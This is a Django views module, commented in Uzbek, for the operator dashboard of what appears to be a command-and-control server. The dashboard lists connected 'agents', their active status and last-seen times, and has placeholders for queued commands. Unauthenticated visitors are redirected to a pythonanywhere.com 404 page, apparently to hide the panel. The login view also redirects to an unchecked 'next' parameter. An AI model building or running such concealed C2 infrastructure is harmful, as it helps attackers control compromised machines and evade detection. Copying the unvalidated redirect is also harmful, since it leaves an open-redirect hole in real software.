"""
Web Interface Views - Server Dashboard
Login qilgan mijozlar uchun server ma'lumotlari
"""

from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.http import HttpResponseRedirect
from django.views.decorators.cache import never_cache
import socket
import platform
from datetime import datetime
from c2_agents.models import Agent


def get_server_info():
    """Server ma'lumotlarini olish"""
    try:
        # Server IP
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # External IP (optional)
        try:
            import requests
            external_ip = requests.get('https://api.ipify.org', timeout=2).text
        except:
            external_ip = 'Unknown'
        
        # System info
        system_info = {
            'hostname': hostname,
            'local_ip': local_ip,
            'external_ip': external_ip,
            'platform': platform.system(),
            'platform_version': platform.version(),
            'python_version': platform.python_version(),
            'uptime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        
        return system_info
    except Exception as e:
        return {
            'error': str(e),
            'hostname': 'Unknown',
            'local_ip': 'Unknown',
        }


@never_cache
def home_view(request):
    """
    Home page - Login qilgan mijozga server info ko'rsatish
    Login qilmagan bo'lsa - pythonanywhere 404 ga redirect
    """
    if not request.user.is_authenticated:
        # Pythonanywhere.com 404 page ga redirect
        return HttpResponseRedirect('https://www.pythonanywhere.com/404')
    
    # Login qilgan - server info ko'rsatish
    server_info = get_server_info()
    
    # Agent statistics
    agents = Agent.objects.all()
    active_agents = agents.filter(status='active').count()
    total_agents = agents.count()
    
    # Commands statistics (placeholder - model yo'q)
    total_commands = 0
    pending_commands = 0
    
    context = {
        'server_info': server_info,
        'stats': {
            'total_agents': total_agents,
            'active_agents': active_agents,
            'total_commands': total_commands,
            'pending_commands': pending_commands,
        },
        'agents': agents[:10],  # Last 10 agents
        'user': request.user,
    }
    
    return render(request, 'home.html', context)


@never_cache
def login_view(request):
    """Login page"""
    if request.user.is_authenticated:
        return redirect('home')
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        user = authenticate(request, username=username, password=password)
        
        if user is not None:
            login(request, user)
            next_url = request.GET.get('next', 'home')
            return redirect(next_url)
        else:
            error = 'Invalid username or password'
            return render(request, 'login.html', {'error': error})
    
    return render(request, 'login.html')


def logout_view(request):
    """Logout"""
    logout(request)
    return HttpResponseRedirect('https://www.pythonanywhere.com/404')


@login_required(login_url='/login/')
def agents_view(request):
    """Agents list page"""
    agents = Agent.objects.all().order_by('-last_seen')
    
    context = {
        'agents': agents,
        'total': agents.count(),
        'active': agents.filter(status='active').count(),
    }
    
    return render(request, 'agents.html', context)


@login_required(login_url='/login/')
def agent_detail_view(request, agent_id):
    """Agent detail page"""
    try:
        agent = Agent.objects.get(agent_id=agent_id)
        # Commands placeholder - model yo'q
        commands = []
        
        context = {
            'agent': agent,
            'commands': commands,
        }
        
        return render(request, 'agent_detail.html', context)
    except Agent.DoesNotExist:
        return redirect('agents')
